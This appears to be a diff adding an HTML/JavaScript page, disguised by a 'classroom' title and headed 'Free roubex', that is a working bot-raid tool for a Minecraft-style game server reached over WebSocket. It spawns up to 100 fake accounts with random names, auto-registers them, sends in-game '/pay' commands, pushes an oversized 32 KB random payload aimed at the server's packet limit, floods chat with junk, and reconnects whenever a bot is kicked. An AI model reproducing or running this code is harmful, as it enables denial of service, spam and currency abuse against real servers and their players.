@@ -1,0 +1,299 @@
+<html style="color-scheme:dark">
+<head>
+<title>Gololol Clasrololom</title>
+</head>
+<!-- kesect aka Fergus Morris -->
+<style>
+/* kesect aka Fergus Morris */
+
+button {
+	height:35px;
+	width:100px;
+	font-size:1.3rem
+}
+
+input {
+	height:35px !important;
+	width:300px !important;
+	font-size:1.3rem
+}
+</style>
+
+<div>
+<h1 style="font-size:2.5rem;margin-bottom:0">Free roubex</h1>
+<h2 style="margin-top:0;margin-bottom:0;font-weight:100;font-size:0.8rem">&copy; hecker 2026. Do not distribute</h2>
+<div id="log">
+
+</div>
+<h1 style="margin-bottom:0" id="accountsn">Accounts [1]</h1>
+<input style="margin-bottom:0;width:300px" type="range" id="accounts" min="1" max="100" value="1" />
+</div>
+
+<div>
+<h1 style="margin-bottom:0;margin-top:0">Server addr</h1>
+<input id="addr" value="wss://nexomc.org" style="margin-bottom:10px"/>
+</div>
+
+<div>
+<h1 style="margin-bottom:0;margin-top:0">Username</h1>
+<input maxlength="13" id="username" value="hecker"/>
+</div>
+
+<div>
+<h1 style="margin-bottom:0;margin-top:0">Message</h1>
+<textarea maxlength="125" id="spam" style="font-size:1.5rem">Hello!</textarea>
+</div>
+
+<div>
+<button style="width:300px;margin-top:10px" id="probe">Probe</button>
+</div>
+<button style="width:300px;margin-top:10px" id="raid">Raid</button>
+<script>
+// kesect aka Fergus Morris
+
+document.getElementById("username").oninput = function(event) {
+	document.getElementById("username").setAttribute("value", event.target.value)
+}
+
+var accounts = 25
+var probe = document.getElementById("probe")
+var addr = document.getElementById("addr")
+var logs = document.getElementById("log")
+
+var encoder = new TextEncoder()
+var accounto0 = 1
+
+const handshake = new Uint8Array([1,2,0,3,0,2,0,3,0,4,0,1,1,84,16,69,97,103,108,101,114,99,114,97,102,116,32,49,46,49,50,2,117,50,0]);
+
+var spam = "Hello!"
+document.getElementById("spam").oninput = function(event) {
+	spam = event.target.value
+}
+
+function genusername() {
+    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    let username = document.getElementById("username").value;
+    while (username.length < 16) {
+        username += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return encoder.encode(username);
+}
+
+// 127
+function randomjunk(l) {
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_";
+    let thejunk = "";
+	while (thejunk.length < l) {
+		thejunk += chars.charAt(Math.floor(Math.random() * chars.length));
+	}
+    return thejunk;
+}
+
+
+function newlog(msg) {
+	var log = document.createElement("span")
+	log.textContent = msg
+	logs.appendChild(log)
+	var log = document.createElement("br")
+	logs.appendChild(log)
+}
+
+function handshaked(server2, username2) {
+    const p1 = new Uint8Array(52)
+	p1.set(handshake, 0)
+	p1[35] = 16
+	p1.set(username2, 36)
+	server2.send(p1)
+	return username2
+}
+
+function login(server, theusernamei) {
+const msg = new Uint8Array(1 + 1 + theusernamei.length + 11);
+msg.set([0x04], 0);
+msg.set([theusernamei.length], 1);
+msg.set(theusernamei, 2);
+msg.set([0x07, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x00, 0x01, 0x00],theusernamei.length + 2);
+server.send(msg);
+newlog("Logging in...");
+}
+
+function skin(server2) {
+// RAW PACKET CAPTURE
+server2.send(new Uint8Array([
+    0x07, 0x03, 0x07, 0x73, 0x6b, 0x69, 0x6e, 0x5f, 0x76, 0x32, 0x00, 0x05, 0x01, 0x00, 0x00, 0x00, 
+    0x0e, 0x0d, 0x62, 0x72, 0x61, 0x6e, 0x64, 0x5f, 0x75, 0x75, 0x69, 0x64, 0x5f, 0x76, 0x31, 0x00, 
+    0x10, 0x52, 0x2b, 0x2c, 0xe5, 0xc9, 0xb9, 0x36, 0xcf, 0xbe, 0x7c, 0x5d, 0x90, 0xf5, 0x5e, 0x63, 
+    0x1a, 0x07, 0x63, 0x61, 0x70, 0x65, 0x5f, 0x76, 0x31, 0x00, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00
+]))
+newlog("Sent skin")
+server2.send(new Uint8Array([0x08]))
+}
+
+document.getElementById("accounts").oninput = function(event) {
+	accounto0 = Number(event.target.value)
+    document.getElementById("accountsn").innerText = "Accounts [" + event.target.value + "]"
+}
+
+payloady = [
+0x09, 0x08, 0x4D, 0x43, 0x7C, 0x42, 0x72, 0x61,
+0x6E, 0x64, 0x6F, 0x65, 0x61, 0x67, 0x6C, 0x65, 0x72
+]
+d = 32768 - payloady.length // IOException: Payload may not be larger than 32767 bytes
+for (let i = 0; i < d; i++) {
+	payloady.push(Math.floor(Math.random() * 255));
+}
+
+payloady = new Uint8Array(payloady)
+
+function getMsg(text) {
+    const construct = new Uint8Array(2 + text.length)
+    construct[0] = 0x02
+    construct[1] = text.length
+    construct.set(text, 2)
+    return construct
+}
+
+function skipit(servor) {
+	servor.send(getMsg(encoder.encode("/nlogin click notification 1 2")))
+	setTimeout(function() {
+		if (servor.readyState == WebSocket.OPEN) {
+			password = randomjunk(12)
+			servor.send(getMsg(encoder.encode("/register " + password + " " + password)))
+			servor.send(getMsg(encoder.encode("/Register " + password + " " + password)))
+			servor.send(getMsg(encoder.encode("/server survival")))
+			servor.send(getMsg(encoder.encode("/pay playGG 250")))
+		}
+	}, 100)
+}
+
+function raid(u) {
+	newlog("Connecting...")
+	let trinidad = new WebSocket(addr.value);
+	trinidad.binaryType = "arraybuffer";
+	let process = "start"
+	trinidad.onopen = function() {
+		handshaked(trinidad, u)
+		process = "handshake"
+	}
+	trinidad.onmessage = function(data) {
+		if (process == "handshake" && new Uint8Array(data.data)[0] == 2) {
+			process = "login"
+			login(trinidad, u)
+			return
+		}
+		if (process == "login") {
+			skin(trinidad)
+			process = "in"
+			setTimeout(function() {
+				if (trinidad.readyState == WebSocket.OPEN) {
+					newlog("sending more client info")
+					setTimeout(function() {
+						if (trinidad.readyState == WebSocket.OPEN) {
+						trinidad.send(new Uint8Array([
+							0x04, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53, 0x03,
+							0x00, 0x01, 0x7f, 0x01
+						]))
+						trinidad.send(payloady)
+						}
+					}, 5000)
+					setTimeout(function() {
+						skipit(trinidad)
+						setTimeout(function() {
+							let pn = setInterval(function() {
+								if (trinidad.readyState == WebSocket.OPEN) {
+									let m = spam
+									m = m + randomjunk(127 - m.length)
+									trinidad.send(getMsg(encoder.encode(m)))
+									document.getElementById("log").innerText = ""
+								} else {
+									clearInterval(pn)
+								}
+							}, Math.random() * 200)
+						}, 325)
+					}, 500)
+				}
+			}, 500)
+		}
+	}
+	trinidad.onclose = function() {
+		raid(u)
+	}
+}
+
+probe.onclick = function() {
+	probe.disabled = true
+	document.getElementById("log").innerText = ""
+	const server = new WebSocket(addr.value);
+	server.binaryType = "arraybuffer";
+	newlog("Connecting")
+	let process = "start"
+	let u = genusername()
+	server.onopen = function() {
+		handshaked(server, u)
+		process = "handshake"
+	}
+	let natural = false
+	server.onmessage = function(data) {
+		FUCKYOU = new Uint8Array(data.data)
+		if (FUCKYOU.length > 3) {
+			if (FUCKYOU[0] == 0x0F && FUCKYOU[1] == 0x4A) {
+				FUCKYOU.slice(2, -1)
+				console.log(new TextDecoder().decode(FUCKYOU.slice(2, -1)))
+			}
+		}
+		if (new Uint8Array(data.data)[0] == 0xFF) {
+			newlog("Server is doing conncetion analyzing / rate limit")
+			return
+		}
+		if (process == "handshake" && new Uint8Array(data.data)[0] == 2) {
+			newlog("Handshaked with server")
+			process = "login"
+			login(server, u)
+			return
+		}
+		if (process == "login") {
+			skin(server)
+			process = "in"
+			setTimeout(function() {
+				if (server.readyState == WebSocket.OPEN) {
+					server.send(new Uint8Array([
+							0x04, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53, 0x03,
+							0x00, 0x01, 0x7f, 0x01
+					]))
+					server.send(payloady)
+					newlog("Trying to auth")
+					skipit(server)
+					setTimeout(function() {
+						if (server.readyState == WebSocket.OPEN) {
+							let code = randomjunk(4)
+							newlog('!!! Please look for any chat messages that say "' + code + '"')
+							server.send(getMsg(encoder.encode(code)))
+							natural = true
+							server.close()
+							probe.disabled = false
+						}
+					}, 1000)
+				}
+			}, 500)
+		}
+	}
+	server.onclose = function() {
+		if (!natural) {
+			newlog("Failed to probe")
+			probe.disabled = false
+		}
+	}
+}
+
+document.getElementById("raid").onclick = function() {
+	document.getElementById("raid").disabled = true
+	document.getElementById("log").innerText = ""
+	for (let i = 0; i < accounto0; i++) {
+		raid(genusername())
+	}
+	setInterval(function() {
+		document.getElementById("log").innerText = ""
+	}, 50)
+}
+</script>
+</html>
